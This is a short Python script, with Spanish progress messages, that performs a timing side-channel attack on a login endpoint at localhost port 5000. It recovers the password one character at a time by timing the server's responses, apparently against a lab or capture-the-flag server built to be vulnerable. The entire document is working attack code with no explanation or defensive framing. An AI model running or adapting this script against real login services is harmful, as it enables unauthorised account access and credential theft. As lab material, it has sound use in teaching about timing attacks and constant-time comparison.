import requests
import string
import time

URL = "http://127.0.0.1:5000/login"
charset = string.ascii_letters + string.digits
discovered = ""

def try_password(candidate):
    json_data = {"password": candidate}
    start = time.perf_counter()
    requests.post(URL, json=json_data)
    end = time.perf_counter()
    return end - start

while True:
    max_time = 0
    next_char = ""
    for char in charset:
        guess = discovered + char
        elapsed = try_password(guess)
        print(f"Probando: {guess} -> {elapsed:.4f} s")

        if elapsed > max_time:
            max_time = elapsed
            next_char = char

    discovered += next_char
    print(f"[+] Progreso: {discovered}")

    if try_password(discovered) > 0.05 * len(discovered) + 0.02:
        print(f"[✔] Contraseña descubierta: {discovered}")
        break
